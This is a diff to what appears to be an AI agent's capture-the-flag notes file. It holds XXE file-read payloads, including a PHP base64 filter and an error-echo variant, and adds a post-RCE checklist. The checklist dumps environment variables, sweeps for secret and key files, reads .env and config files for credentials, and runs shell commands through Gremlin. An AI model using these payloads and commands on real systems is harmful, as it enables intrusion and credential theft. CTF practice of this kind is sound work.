@@ -82,3 +82,13 @@
 - 经典：`<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><r>&x;</r>`（回显）。
 - 无回显 OOB 不可用（无公网）→ 用**报错回显**：`file:///nonexistent/&x;` 让错误里带出内容。
 - PHP 过滤器：`<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/flag">`。
+
+## Post-RCE flag hunt checklist (measured: getResourceAsStream("flag") is a loser bet)
+Once code exec works, hunt in this order (one batched command, not one path per turn):
+1. `env` — flags are frequently injected as environment variables.
+2. Filesystem sweep of likely spots: `ls -la / /root /home/* /var/www/* /app /opt 2>/dev/null | grep -iE "flag|secret|key"` plus `find / -maxdepth 3 -iname "*flag*" -type f 2>/dev/null`.
+3. Web root / app config (`config.php`, `.env`, `application.yml`, `settings.py`) — creds and flag pointers live there.
+4. Process args (`ps auxww`) and cron/systemd unit files.
+Java classloader resource streams only see the JVM classpath — for file reads in
+Gremlin RCE prefer `new java.io.File("/flag").text` style or `["/bin/sh","-c","..."]`
+exec with full output capture.
